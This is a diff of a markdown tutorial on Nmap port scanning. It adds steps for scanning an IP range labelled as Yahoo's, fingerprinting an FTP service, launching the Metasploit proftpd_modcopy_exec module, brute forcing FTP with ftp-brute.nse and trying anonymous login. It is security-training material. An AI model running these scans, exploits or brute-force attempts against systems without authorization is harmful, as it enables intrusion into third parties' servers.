@@ -1,5 +1,5 @@
-
-# Why We Need to Scan Ports with Nmap
+# Nmap basics
+## Why We Need to Scan Ports with Nmap
 
 Before performing penetration testing on a server, we must gather information about its open ports. Understanding the open ports is crucial because:
 
@@ -114,5 +114,110 @@ The `-A` switch sends multiple payloads to determine the service. It tries conne
 
 This option also provides additional details, like HTTP methods supported by a web server, or the server type. Such information might even lead to discovering a subdomain takeover vulnerability.
 
+---
+# Advanced Nmap
+
+1. **Creating the Target List**:  
+   Start by creating a file named `target.txt` and add the range of Yahoo IPs:
+	```
+	   119.160.254.0/24
+	```
+   The `/24` indicates the first 3 octets are fixed for the network, allowing IPs from `119.160.254.0` to `119.160.254.255`.
+
+2. **Using Nmap with a List**:  
+   Ensure each line in your file contains either a single IP or one IP range:
+	```bash
+	   nmap -iL target.txt
+	```
+   To check for live hosts:
+	```bash
+	   nmap -iL target.txt -sn
+	```
+
+3. **Identifying Subdomains**:  
+   - If you find a subdomain with `ntp`, it likely indicates a Network Time Protocol server, which helps sync time across servers.
+   - `lb` in a subdomain usually stands for a load balancer.
+
+4. **Scanning for Top Ports**:  
+   To scan the top 1000 most common ports:
+	```bash
+	   nmap -iL target.txt --top-ports 1000
+	```
+
+5. **Deep Scanning**:  
+   If you identify an interesting target like an FTP server, scan all ports with:
+	```bash
+	   nmap <target> -p 1-65535
+	```
+   To gather more details on the FTP server:
+	```bash
+	   nmap <target> -p 21 -A
+	```
+   Look for the FTP version in the output, then search for known exploits on exploit-db.com or use Metasploit.
+
+6. **Using Metasploit**:  
+   Start Metasploit:
+	```bash
+	   msfconsole
+	```
+   Search for available exploits:
+	```bash
+	   search proftpd
+	```
+   If you are lucky, you will find exploits for this FTP version (which you identified earlier using exploit-db.com).  
+   Use the `use` command with the exploit path, for example:
+	```bash
+	   use exploit/unix/ftp/proftpd_modcopy_exec
+	```
+   Run `show options` to see which options need to be set for the exploit.
+
+   The **Required** column shows the options that must be set, while the **Current** column displays the current values that will be used if you don’t change them.
+
+   Next, set the remote host:
+	```bash
+	   set RHOST <target>
+	```
+   Then run the exploit:
+	```bash
+	   exploit
+	```
+
+   In this case, the exploit didn’t succeed because it required port 80 to be open, which wasn’t the case here. However, now you know the process for running exploits!
+
+7. **Brute Forcing with Nmap**:  
+   You can use Nmap’s FTP brute-force script:
+	```bash
+	   nmap <target> -p 21 --script=ftp-brute.nse
+	```
+
+8. **Saving Nmap Output**:  
+   To save the results in different formats:
+	```bash
+	   nmap <target> <options> --oG grep_output.txt
+	```
+   For XML:
+	```bash
+	   --oX output.xml
+	```
+   For all formats:
+	```bash
+	   --oA yahoo
+	```
+
+9. **Testing FTP with Anonymous Login**:  
+   Try connecting to the FTP server with anonymous credentials to see if access is allowed and explore potential vulnerabilities.
+
+#### Stay Informed with Fulldisclosure: A Hub for Security Discussions and Resources
+**[Fulldisclosure](https://nmap.org/mailman/listinfo/fulldisclosure)** is a public platform for discussing security vulnerabilities, exploitation methods, and related resources. It upholds the right of researchers to openly share their discoveries, promoting transparency. Moderation is minimal, handled by volunteers, so users must approach content with caution. Posting requires a subscription, and all posts are publicly archived unless otherwise specified.
+
+
+---
 ## Tasks
 - Study Nmap switches and options to improve scanning techniques.
+- Search for subnet calculator.
+
+## More
+- [شرح مفصل لل IP Address وال Subnet Mask, الفرق بين Public IP Vs Private IP](https://youtu.be/Nnv36wG_iCI?feature=shared).
+- [What Is NTP?](https://info.support.huawei.com/info-finder/encyclopedia/en/NTP.html)
+- [What is load balancing? | How load balancers work.](https://www.cloudflare.com/learning/performance/what-is-load-balancing/)
+- Search for Metasploit and how to use it.
